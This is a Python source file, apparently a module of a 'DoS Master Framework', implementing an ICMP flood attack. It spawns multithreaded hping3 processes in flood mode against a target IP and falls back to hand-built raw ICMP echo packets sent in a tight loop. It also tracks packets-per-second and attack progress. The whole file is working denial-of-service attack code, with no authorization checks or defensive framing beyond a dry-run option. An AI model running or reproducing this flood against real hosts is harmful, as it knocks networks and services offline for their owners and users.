#!/usr/bin/env python3
"""
DoS Master Framework - ICMP Flood Attack Module - FIXED VERSION
Professional ICMP flood implementation with proper hping3 integration
"""

import subprocess
import threading
import time
import socket
import struct
import os
import signal
from typing import Dict, Any
from datetime import datetime

class ICMPFlood:
    """ICMP flood attack implementation"""
    
    def __init__(self, config: Dict, logger):
        self.config = config
        self.logger = logger
        self.target = config['target']
        self.duration = config.get('duration', 60)
        self.threads = config.get('threads', 5)
        self.packet_size = config.get('payload_size', 1024)
        self.rate_limit = config.get('rate', 0)
        self.dry_run = config.get('dry_run', False)
        
        self.packets_sent = 0
        self.packets_failed = 0
        self.attack_active = False
        self.start_time = None
        self.worker_threads = []
        self.packet_lock = threading.Lock()
        
    def validate_config(self) -> bool:
        """Validate attack configuration"""
        try:
            # Validate target IP
            socket.inet_aton(self.target)
            
            # Validate parameters
            if self.duration <= 0 or self.duration > 3600:
                self.logger.error("Duration must be between 1 and 3600 seconds")
                return False
                
            if self.threads <= 0 or self.threads > 100:
                self.logger.error("Threads must be between 1 and 100")
                return False
                
            if self.packet_size < 8 or self.packet_size > 65507:
                self.logger.error("Packet size must be between 8 and 65507 bytes")
                return False
            
            return True
            
        except socket.error:
            self.logger.error(f"Invalid target IP address: {self.target}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """Execute ICMP flood attack"""
        self.logger.info(f"Starting ICMP flood attack against {self.target}")
        
        if self.dry_run:
            return self._simulate_attack()
        
        self.attack_active = True
        self.start_time = time.time()
        
        try:
            # Start worker threads
            for i in range(self.threads):
                thread = threading.Thread(target=self._icmp_worker, args=(i,))
                thread.daemon = True
                thread.start()
                self.worker_threads.append(thread)
                time.sleep(0.1)  # Stagger thread starts
            
            # Monitor attack progress
            self._monitor_attack()
            
            # Wait for all threads to complete
            for thread in self.worker_threads:
                thread.join(timeout=2)
            
            # Calculate results
            end_time = time.time()
            actual_duration = end_time - self.start_time
            avg_rate = self.packets_sent / actual_duration if actual_duration > 0 else 0
            
            result = {
                'attack_type': 'icmp_flood',
                'target': self.target,
                'duration': actual_duration,
                'packets_sent': self.packets_sent,
                'packets_failed': self.packets_failed,
                'success_rate': (self.packets_sent / (self.packets_sent + self.packets_failed)) * 100 if (self.packets_sent + self.packets_failed) > 0 else 0,
                'avg_rate': avg_rate,
                'threads_used': self.threads,
                'packet_size': self.packet_size,
                'timestamp': datetime.now().isoformat()
            }
            
            self.logger.info(f"ICMP flood completed: {self.packets_sent} packets sent")
            return result
            
        except Exception as e:
            self.logger.error(f"ICMP flood attack failed: {e}")
            raise
        finally:
            self.attack_active = False
    
    def _icmp_worker(self, worker_id: int):
        """ICMP flood worker thread - FIXED VERSION"""
        self.logger.debug(f"ICMP worker {worker_id} started")
        
        local_packets = 0
        
        try:
            # Check if hping3 exists
            if not self._check_hping3():
                self.logger.error("hping3 not found, falling back to Python implementation")
                return self._python_icmp_worker(worker_id)
            
            # Build hping3 command
            if self.rate_limit > 0:
                # Rate limited version - more reliable
                packets_per_second = max(1, self.rate_limit // self.threads)
                total_packets = packets_per_second * self.duration
                interval_ms = max(1, 1000 // packets_per_second)
                
                cmd = [
                    'hping3',
                    '--icmp',
                    '-i', f'{interval_ms}',
                    '-c', str(total_packets),
                    '-d', str(self.packet_size),
                    self.target
                ]
            else:
                # Flood mode with duration limit
                cmd = [
                    'hping3',
                    '--icmp',
                    '--flood',
                    '-d', str(self.packet_size),
                    self.target
                ]
            
            self.logger.debug(f"Worker {worker_id} command: {' '.join(cmd)}")
            
            # Start hping3 process
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid  # Create process group
            )
            
            # Monitor process and count packets
            start_time = time.time()
            last_check = start_time
            
            while self.attack_active and (time.time() - start_time) < self.duration:
                if process.poll() is not None:
                    break
                
                # Estimate packets based on time (for flood mode)
                current_time = time.time()
                if current_time - last_check >= 1.0:  # Check every second
                    if self.rate_limit > 0:
                        estimated_packets = int((current_time - start_time) * (self.rate_limit // self.threads))
                    else:
                        # Estimate based on typical flood rates
                        estimated_packets = int((current_time - start_time) * 1000)  # ~1000 pps
                    
                    new_packets = estimated_packets - local_packets
                    local_packets = estimated_packets
                    
                    with self.packet_lock:
                        self.packets_sent += new_packets
                    
                    last_check = current_time
                
                time.sleep(0.1)
            
            # Terminate process gracefully
            if process.poll() is None:
                try:
                    # Send SIGTERM to process group
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    process.wait(timeout=3)
                except Exception as e:
                    self.logger.debug(f"Graceful termination failed: {e}")
                    try:
                        process.kill()
                        process.wait(timeout=1)
                    except:
                        pass
            
            # Try to get actual packet count from output
            try:
                stdout, stderr = process.communicate(timeout=2)
                actual_packets = self._parse_hping_output(stdout, worker_id)
                if actual_packets > 0:
                    # Update with actual count if available
                    with self.packet_lock:
                        self.packets_sent = self.packets_sent - local_packets + actual_packets
                    local_packets = actual_packets
            except Exception as e:
                self.logger.debug(f"Failed to get hping3 output: {e}")
            
            self.logger.debug(f"Worker {worker_id} completed: ~{local_packets} packets")
            
        except Exception as e:
            self.logger.error(f"ICMP worker {worker_id} failed: {e}")
            with self.packet_lock:
                self.packets_failed += 1
    
    def _python_icmp_worker(self, worker_id: int):
        """Fallback Python ICMP implementation"""
        self.logger.debug(f"Python ICMP worker {worker_id} started (fallback)")
        
        try:
            # Create raw ICMP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            
            # ICMP packet structure
            def create_icmp_packet():
                # ICMP Echo Request (type=8, code=0)
                icmp_type = 8
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = os.getpid() & 0xFFFF
                icmp_seq = 1
                
                # Create header
                header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                
                # Create payload
                payload = b'A' * (self.packet_size - 8)  # 8 bytes for ICMP header
                
                # Calculate checksum
                packet = header + payload
                checksum = self._calculate_checksum(packet)
                
                # Recreate with correct checksum
                header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
                return header + payload
            
            packet = create_icmp_packet()
            local_packets = 0
            start_time = time.time()
            
            while self.attack_active and (time.time() - start_time) < self.duration:
                try:
                    sock.sendto(packet, (self.target, 0))
                    local_packets += 1
                    
                    # Rate limiting
                    if self.rate_limit > 0:
                        delay = self.threads / self.rate_limit
                        time.sleep(delay)
                    else:
                        time.sleep(0.001)  # Small delay to prevent overwhelming
                        
                except Exception as e:
                    with self.packet_lock:
                        self.packets_failed += 1
                    time.sleep(0.01)
            
            sock.close()
            
            with self.packet_lock:
                self.packets_sent += local_packets
            
            self.logger.debug(f"Python ICMP worker {worker_id} sent {local_packets} packets")
            
        except PermissionError:
            self.logger.error(f"Worker {worker_id}: Raw socket requires root privileges")
            with self.packet_lock:
                self.packets_failed += 1
        except Exception as e:
            self.logger.error(f"Python ICMP worker {worker_id} failed: {e}")
            with self.packet_lock:
                self.packets_failed += 1
    
    def _calculate_checksum(self, data):
        """Calculate ICMP checksum"""
        checksum = 0
        # Make 16 bit words out of every two adjacent bytes
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                word = (data[i] << 8) + data[i + 1]
            else:
                word = data[i] << 8
            checksum += word
        
        # Add any carry bits
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        
        # One's complement
        return ~checksum & 0xFFFF
    
    def _check_hping3(self) -> bool:
        """Check if hping3 is available"""
        try:
            subprocess.run(['hping3', '--version'], capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def _parse_hping_output(self, output: str, worker_id: int) -> int:
        """Parse hping3 output to extract statistics"""
        try:
            lines = output.split('\n')
            for line in lines:
                if 'packets transmitted' in line:
                    # Extract packet count: "5 packets transmitted"
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part == 'packets' and i > 0:
                            try:
                                packets = int(parts[i-1])
                                self.logger.debug(f"Worker {worker_id}: parsed {packets} packets from output")
                                return packets
                            except ValueError:
                                continue
            return 0
        except Exception as e:
            self.logger.debug(f"Failed to parse hping output: {e}")
            return 0
    
    def _monitor_attack(self):
        """Monitor attack progress"""
        while self.attack_active:
            elapsed = time.time() - self.start_time if self.start_time else 0
            remaining = max(0, self.duration - elapsed)
            
            if elapsed > 0:
                current_rate = self.packets_sent / elapsed
                self.logger.info(f"ICMP flood progress: {elapsed:.1f}s elapsed, "
                               f"{self.packets_sent} packets sent, "
                               f"{current_rate:.1f} pps, "
                               f"{remaining:.1f}s remaining")
            
            if remaining <= 0:
                self.attack_active = False
                break
                
            time.sleep(5)
    
    def _simulate_attack(self) -> Dict[str, Any]:
        """Simulate attack for dry-run mode"""
        self.logger.info("Simulating ICMP flood attack (dry-run mode)")
        
        # Simulate attack metrics
        estimated_packets = self.threads * 1000 * self.duration  # Rough estimate
        
        time.sleep(2)  # Brief simulation delay
        
        return {
            'attack_type': 'icmp_flood',
            'target': self.target,
            'duration': self.duration,
            'packets_sent': estimated_packets,
            'packets_failed': 0,
            'success_rate': 100.0,
            'avg_rate': estimated_packets / self.duration,
            'threads_used': self.threads,
            'packet_size': self.packet_size,
            'timestamp': datetime.now().isoformat(),
            'dry_run': True
        }
    
    def stop(self):
        """Stop the attack"""
        self.logger.info("Stopping ICMP flood attack")
        self.attack_active = False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
        
        return {
            'attack_type': 'icmp_flood',
            'active': self.attack_active,
            'elapsed_time': elapsed,
            'packets_sent': self.packets_sent,
            'current_rate': current_rate,
            'threads_active': len([t for t in self.worker_threads if t.is_alive()])
        }